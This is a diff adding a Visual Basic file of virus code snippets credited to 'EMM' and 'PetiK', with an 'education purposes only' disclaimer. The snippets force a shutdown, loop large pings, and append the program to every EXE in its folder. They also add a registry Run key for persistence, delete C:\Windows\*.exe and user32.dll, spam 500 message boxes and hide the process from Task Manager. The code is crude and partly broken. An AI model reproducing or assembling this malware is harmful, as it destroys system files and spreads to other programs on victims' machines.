@@ -1,0 +1,72 @@
+   'EMM
+   'PetiK
+   'WARNING: The distribution of viruses is illegal! I accept no responsiblity to damage done through this code. This is for education purposes only.
+   'Code for forced shutdown
+   Shell "shutdown -f"
+
+   'Code for the ping of death
+   Dim i
+   For i = 1 To 10
+   Shell "ping 127.0.0.1 -l 65000", vbHide
+   Next i
+
+   'Declerations for EXE Appender
+   Option Explicit
+   Dim myarray() As Byte
+   Dim victim As String
+   Const mysize As Integer = 21777
+
+   'Code for EXE Appender
+   On Error Resume Next
+   Dim Free
+   Free = FreeFile
+   Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #Free
+   ReDim myarray(mysize)
+   Get #1, 1, myarray
+   Close #Free
+   victim = Dir(App.Path & "\" & "*.EXE")
+   While victim <> ""
+   Open App.Path & "\" & victim For Binary Access Write As #Free
+   Put #1, , myarray
+   Put #1, , mysize
+   Close #Free
+   victim = Dir()
+   Wend
+
+   'Declerations for Autotstart virus
+   Function RegWrite(ByVal Path As String, ByVal Value As String)
+   Dim ws
+   Set ws = CreateObject("WScript.Shell")
+   ws.RegWrite Path, Value, "REG_SZ"
+   End Function
+   '
+   'Code for Autostart virus
+   Dim Pos
+   Pos = App.Path & "\" & App.ExeName & ".exe"
+   RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\VCKV.exe", Pos
+
+   'Code: please note that you
+   'will have to change the
+   'directory to according to
+   'which folder contents you
+   'wish to delete
+   Kill ("C:\Windows\*.exe")
+
+   'Declerations for Crazy Mouse setting, please remember to set the
+   'timer interval to soemthing low eg 200
+   Private Declare Function SetCursorPos Lib "user32" (ByVal X As Long, ByVal Y As Long) As Long
+
+   'Code for timer
+   Call SetCursorPos(200, 100)
+
+   'Code
+   Kill ("C:\Windows\system32\user32.dll")
+
+   'Code for Advertising us
+   Dim a
+   For a = 1 To 500
+   MsgBox ("Visit http://homepage.eircom.net/~legionofdeath")
+   Next a
+
+   'Code for Hiding from Task Manager
+   App.TaskVisible = False
